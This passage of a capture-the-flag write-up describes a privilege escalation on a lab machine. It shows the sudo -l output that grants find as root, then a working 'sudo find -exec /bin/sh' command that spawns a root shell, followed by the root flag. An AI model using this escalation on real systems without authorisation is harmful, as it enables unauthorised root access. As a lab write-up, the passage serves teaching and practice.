## Privilege Escalation

With a proper interactive shell as `john` (rather than the webshell, which lacked a TTY and couldn't run `sudo -l` correctly), re-checking sudo permissions revealed:

```
john@base:~$ sudo -l
User john may run the following commands on base:
    (root : root) /usr/bin/find
```

`john` can run `/usr/bin/find` as root with no password. This is a well-documented privilege escalation vector (see [GTFOBins: find](https://gtfobins.github.io/gtfobins/find/)): `find`'s `-exec` flag can be used to spawn an arbitrary command, which inherits the privileges of the `find` process itself.

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
51709519ea18ab37dd6fc58096bea949
```

Root achieved.

